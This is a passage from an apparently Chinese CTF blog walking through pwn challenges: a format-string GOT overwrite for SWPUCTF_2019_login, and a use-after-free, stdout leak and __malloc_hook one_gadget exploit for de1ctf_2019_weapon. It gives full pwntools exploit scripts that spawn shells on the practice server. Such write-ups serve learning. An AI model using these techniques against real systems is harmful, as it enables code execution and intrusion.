<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>这里为什么我们不直接利用%n直接修改而是分为两部分进行呢？</p>
<p>我们可以尝试一下直接修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">got_addr &#x3D; (stack_addr - 4)</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(got_addr&amp;0xFF) + &#39;c%6$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; printf_got#&amp;0xff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(printf) + &#39;c%10$n&#39;</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220211155133656.png?raw=true" alt="image-20220211155133656.png"></p>
<p>发现栈区域直接混乱了</p>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;SWPUCTF_2019_login&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;SWPUCTF_2019_login&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25727)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input your name:&#39;)</span><br><span class="line">p.send(&#39;aaa&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input your password:&#39;)</span><br><span class="line">p.sendline(&#39;%6$p&#39;)</span><br><span class="line">p.recvuntil(&#39;This is the wrong password: &#39;)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">stack_addr &#x3D; int(p.recv(8).strip(),16)</span><br><span class="line">#print(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">p.sendline(&#39;%15$p&#39;)</span><br><span class="line">p.recvuntil(&#39;This is the wrong password: &#39;)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_addr &#x3D; int(p.recv(8).strip(),16)- 241</span><br><span class="line">libc_base &#x3D; libc_addr  - libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line">#print(hex(libc_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">got_addr &#x3D; (stack_addr - 4)</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(got_addr&amp;0xFF) + &#39;c%6$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; printf_got&amp;0xff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(printf) + &#39;c%10$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">got_addr &#x3D; (stack_addr - 8)</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(got_addr&amp;0xFF) + &#39;c%6$hhn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; (printf_got+2)&amp;0xffff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(printf) + &#39;c%10$hn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">system_1 &#x3D; system_addr &amp;0xffff</span><br><span class="line">system_2 &#x3D; system_addr&gt;&gt;16</span><br><span class="line">system_2 &#x3D; system_2-system_1</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">printf &#x3D; (printf_got+2)&amp;0xffff	</span><br><span class="line">payload &#x3D; &#39;%&#39; + str(system_1) + &#39;c%9$hn%&#39; + str(system_2) + &#39;c%8$hn&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;Try again!&#39;)</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h1><h2 id="Checksec-4"><a href="#Checksec-4" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214133839099.png?raw=true" alt="image-20220214133839099.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214133852168.png?raw=true" alt="image-20220214133852168.png"></p>
<p>保护全开，且从目前的运行情况来看缺少Show功能</p>
<p>那么我们就要想办法来泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在2.23常用的泄露地址办法</span><br><span class="line">1.house of force             ------  需要修改top_chunk</span><br><span class="line">2.stdout</span><br></pre></td></tr></table></figure>

<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214134059247.png?raw=true" alt="image-20220214134059247.png"></p>
<p>在free()函数中存在指针悬挂</p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>1.首先堆题目我们都需要先泄露地址，但目前我们在add函数中发现我们申请的大小被限制，都属于fastbin不能进入unsortbin难以泄露地址</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214134815757.png?raw=true" alt="image-20220214134815757.png"></p>
<p>那么我们就需要想办法进行修改了，我们可以首先想到free函数中的指针悬挂漏洞，我们应该怎么利用呢？</p>
<p>首先先尝试add几个试试，发现并没有什么，然后我们创建四个然后释放中间两个试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x18,&#39;1&#39;)</span><br><span class="line">add(1,0x60,&#39;2&#39;)</span><br><span class="line">add(2,0x60,&#39;3&#39;)</span><br><span class="line">add(3,0x28,&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214135105457.png?raw=true" alt="image-20220214135105457.png"></p>
<p>因为存在指针悬挂所以我们是可以利用edit(index=2)来修改这个fastbin指针的从而达到一定的写目的，我们利用这个方法来进行伪造fake_chunk从而使其进入unsortbin泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(0) + p64(0x71)</span><br><span class="line">add(0,0x18,payload)</span><br><span class="line">add(1,0x60,&#39;2&#39;)</span><br><span class="line">add(2,0x60,&#39;3&#39;)</span><br><span class="line">add(3,0x28,&#39;4&#39;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">edit(2,&#39;\x10&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214135327870.png?raw=true" alt="image-20220214135327870.png"></p>
<p>这时候我们的链表指向fake_chunk</p>
<p>那么接下来我们创建的chunk就可以控制其他的privesize了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----首先把之前的第三个填回去，这里的0x91是满足刚好可以覆盖到top_chunk前，不过随便什么大小都可以，因为之后用不到了</span><br><span class="line">payload &#x3D; p64(0) + p64(0x91)</span><br><span class="line">add(2,0x60,payload)</span><br><span class="line">----这里我们新建一个chunk，这是非常重要的，因为存在指针悬挂所以这里我们创建的index&#x3D;4后面是可以再次edit的，埋下了伏笔</span><br><span class="line">payload &#x3D; p64(0) + p64(0x71)</span><br><span class="line">add(4,0x60,payload)</span><br><span class="line">delete(1)</span><br><span class="line">----插图1</span><br><span class="line">----这里我们利用我们埋下的伏笔进行edit来释放进入unsortbin</span><br><span class="line">payload &#x3D; p64(0) + p64(0xe1)</span><br><span class="line">edit(4,payload)</span><br><span class="line">delete(1)</span><br><span class="line">----插图2</span><br></pre></td></tr></table></figure>

<p>插图1：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214140457438.png?raw=true" alt="image-20220214140457438.png"></p>
<p>插图2：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214140538644.png?raw=true" alt="image-20220214140538644.png"></p>
<p>2.既然已经进入了unsortbin那么接下来我们就需要利用edit对这个地址进行修改使得我们能够利用IO来进行泄露</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/WYO7NGXO6%7B3DD_7B0NK3FC.png?raw=true" alt="WYO7NGXO6{3DD_7B0NK3FC.png"></p>
<p>找到了一个适合的地址，那么就进行修改</p>
<p>尝试一次发现可以修改</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214142500912.png?raw=true" alt="image-20220214142500912.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这里爆破可以用到以下句子</span><br><span class="line">if(__name__ &#x3D;&#x3D; &#39;__main__&#39;):</span><br><span class="line">	while(1):</span><br><span class="line">		try:</span><br><span class="line">			p &#x3D; process(&#39;de1ctf_2019_weapon&#39;)</span><br><span class="line">			</span><br><span class="line">			pwn()</span><br><span class="line">			p.interactive()</span><br><span class="line">		except :</span><br><span class="line">			p.close()</span><br><span class="line">			continue</span><br><span class="line">解放劳动力</span><br></pre></td></tr></table></figure>

<p>3.修改IO</p>
<p>先了解下IO结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype stdout</span><br><span class="line">type &#x3D; struct _IO_FILE &#123;</span><br><span class="line">    int _flags;</span><br><span class="line">    char *_IO_read_ptr;</span><br><span class="line">    char *_IO_read_end;</span><br><span class="line">    char *_IO_read_base;</span><br><span class="line">    char *_IO_write_base;</span><br><span class="line">    char *_IO_write_ptr;   &#x2F;&#x2F;本题用到的 IO_write_ptr 和 IO_write_base</span><br><span class="line">    							这里Puts输出的大小为上述两个值的差，所以我们可以手动将base调为0</span><br><span class="line">    char *_IO_write_end;</span><br><span class="line">    char *_IO_buf_base;</span><br><span class="line">    char *_IO_buf_end;</span><br><span class="line">    char *_IO_save_base;</span><br><span class="line">    char *_IO_backup_base;</span><br><span class="line">    char *_IO_save_end;</span><br><span class="line">    struct _IO_marker *_markers;</span><br><span class="line">    struct _IO_FILE *_chain;</span><br><span class="line">    int _fileno;</span><br><span class="line">    int _flags2;</span><br><span class="line">    __off_t _old_offset;</span><br><span class="line">    unsigned short _cur_column;</span><br><span class="line">    signed char _vtable_offset;</span><br><span class="line">    char _shortbuf[1];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    __off64_t _offset;</span><br><span class="line">    struct _IO_codecvt *_codecvt;</span><br><span class="line">    struct _IO_wide_data *_wide_data;</span><br><span class="line">    struct _IO_FILE *_freeres_list;</span><br><span class="line">    void *_freeres_buf;</span><br><span class="line">    size_t __pad5;</span><br><span class="line">    int _mode;</span><br><span class="line">    char _unused2[20];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>

<p>首先我们计算下我们刚刚创建的堆距离IO的距离</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214142957967.png?raw=true" alt="image-20220214142957967.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;\x00&#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + &#39;\x00&#39;</span><br><span class="line">对应:flag标志位 ，char *_IO_read_end;，char *_IO_read_base;，char *_IO_write_base；最后的&#39;\x00&#39;使得base调小</span><br></pre></td></tr></table></figure>

<p>然后这里记录一个血的错误，就是我们这里构造了payload语句对吧</p>
<p>那么看看下面的写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(5,payload）</span><br><span class="line">payload &#x3D; &#39;\x00&#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + p8(0x58)</span><br></pre></td></tr></table></figure>

<p>已经开始泪流满面了</p>
<p>然后就接收</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stdout &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) -0x83</span><br><span class="line">libc_base &#x3D; stdout - libc.sym[&#39;_IO_2_1_stdout_&#39;]</span><br><span class="line">malloc_hook &#x3D; libc_base + libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">print(hex(malloc_hook))</span><br></pre></td></tr></table></figure>

<p>4.尝试get_shell</p>
<p>但这里遇到一个奇葩问题，这时候add函数忽然就用不了，因为这里add的结构变了需要重新定义</p>
<p>然后我们继续尝试</p>
<p>没想到最难的居然是get_shell我尝试的one_gadget一直打不通</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214152108838.png?raw=true" alt="image-20220214152108838.png"></p>
<p>我们本地显示命名成功覆盖了</p>
<p>我发现真的裂开如果我们仍然用之前的爆破语句的话我们发现，错误了就直接再次重复错误显示的太快了根本看不到</p>
<p>那么我们改进下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(__name__ &#x3D;&#x3D; &#39;__main__&#39;):</span><br><span class="line">	while(1):</span><br><span class="line">		try:</span><br><span class="line">			#p &#x3D; process(&#39;de1ctf_2019_weapon&#39;)</span><br><span class="line">			p &#x3D; remote(&#39;node4.buuoj.cn&#39;,28752)</span><br><span class="line">			pwn()</span><br><span class="line">			p.interactive()</span><br><span class="line">			#break</span><br><span class="line">		except Exception as e:</span><br><span class="line">			print(e)</span><br><span class="line">			p.close()</span><br><span class="line">			continue</span><br><span class="line">这里可以把错误打印出来显示我们爆破的适合就别开context.log_level &#x3D; &#39;debug&#39;了，因为太乱了</span><br></pre></td></tr></table></figure>

<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;de1ctf_2019_weapon&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,28752)</span><br><span class="line">elf &#x3D; ELF(&#39;de1ctf_2019_weapon&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,name):</span><br><span class="line">	p.sendlineafter(&#39;choice &gt;&gt;&#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;wlecome input your size of weapon: &#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;input index: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;input your name:\n&#39;,str(name))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;choice &gt;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;input idx :&#39;,str(index))</span><br><span class="line">def edit(index,name):</span><br><span class="line">	p.sendlineafter(&#39;choice &gt;&gt;&#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;input idx: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;new content:&#39;,str(name))</span><br><span class="line"></span><br><span class="line">def add1(index,size,name):</span><br><span class="line">	p.sendlineafter(&#39;choice &gt;&gt;&#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;wlecome input your size of weapon: &#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;input index: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;input your name:&#39;,str(name))</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">	payload &#x3D; p64(0) + p64(0x71)</span><br><span class="line">	add(0,0x18,payload)</span><br><span class="line">	add(1,0x60,&#39;2&#39;)</span><br><span class="line">	add(2,0x60,&#39;3&#39;)</span><br><span class="line">	add(3,0x28,&#39;4&#39;)</span><br><span class="line">	delete(1)</span><br><span class="line">	delete(2)</span><br><span class="line"></span><br><span class="line">	edit(2,&#39;\x10&#39;)</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(0) + p64(0x91)</span><br><span class="line">	add(2,0x60,payload)</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(0) + p64(0x71)</span><br><span class="line">	add(4,0x60,payload)</span><br><span class="line">	delete(1)</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(0) + p64(0xe1)</span><br><span class="line">	edit(4,payload)</span><br><span class="line">	delete(1)</span><br><span class="line"></span><br><span class="line">	edit(4,p64(0)+p64(0x71))</span><br><span class="line">	edit(1,&#39;\xdd\x65&#39;)</span><br><span class="line">	add(1,0x60,&#39;666&#39;)</span><br><span class="line">	payload &#x3D; &#39;\x00&#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + &#39;\x00&#39;</span><br><span class="line">	add(5,0x60,payload)</span><br><span class="line">	</span><br><span class="line">	#edit(5,payload)</span><br><span class="line">	</span><br><span class="line">	stdout &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) -61 -131</span><br><span class="line">	libc_base &#x3D; stdout - libc.sym[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">	malloc_hook &#x3D; libc_base + libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">	one_gadget &#x3D; libc_base +0xf1147</span><br><span class="line">	realloc &#x3D; libc_base + libc.sym[&#39;realloc&#39;]</span><br><span class="line">	print(hex(one_gadget))</span><br><span class="line">	print(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">	payload &#x3D; p64(malloc_hook-0x23)	</span><br><span class="line">	add1(6,0x60,payload)</span><br><span class="line">	delete(6)</span><br><span class="line">	edit(6,payload)</span><br><span class="line">	add1(7,0x60,&#39;666&#39;)</span><br><span class="line">	payload &#x3D; &#39;\x00&#39;*(0x13) + p64(one_gadget) </span><br><span class="line">	add1(1,0x60,payload)</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	#add1(9,0x60,&#39;666&#39;)</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">	0x45216	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">	constraints:</span><br><span class="line">	rax &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">	0x4526a	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">	constraints:</span><br><span class="line">	[rsp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">	0xf02a4	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x50, environ)</span><br><span class="line">	constraints:</span><br><span class="line">	[rsp+0x50] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">	0xf1147	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">	constraints:</span><br><span class="line">	[rsp+0x70] &#x3D;&#x3D; NULL</span><br><span class="line">	&#39;&#39;&#39;</span><br><span class="line">if(__name__ &#x3D;&#x3D; &#39;__main__&#39;):</span><br><span class="line">	while(1):</span><br><span class="line">		try:</span><br><span class="line">			#p &#x3D; process(&#39;de1ctf_2019_weapon&#39;)</span><br><span class="line">			p &#x3D; remote(&#39;node4.buuoj.cn&#39;,28752)</span><br><span class="line">			pwn()</span><br><span class="line">			p.interactive()</span><br><span class="line">			#break</span><br><span class="line">		except Exception as e:</span><br><span class="line">			print(e)</span><br><span class="line">			p.close()</span><br><span class="line">			continue</span><br></pre></td></tr></table></figure>

<h1 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a>sctf_2019_easy_heap</h1><h2 id="Checksec-5"><a href="#Checksec-5" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214180014368.png?raw=true" alt="image-20220214180014368.png"></p>
<p>保护全开并且少了show功能</p>
<h2 id="利用IDA分析-2"><a href="#利用IDA分析-2" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p>在edit函数中发现存在off-by-null漏洞</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214180117088.png?raw=true" alt="image-20220214180117088.png"></p>
<p>并且这里我们发现add函数只是malloc不进行内容的填充</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>1.首先要找到办法泄露地址，根据我们上一题的经验我们是否可以继续在2.27版本中利用IO来进行地址的泄露呢？</p>
<p>我们要进行IO泄露首先需要能够进行修改指针链</p>
<p>我们既然拥有off-by-one那么就可以利用overlap来进行修改</p>
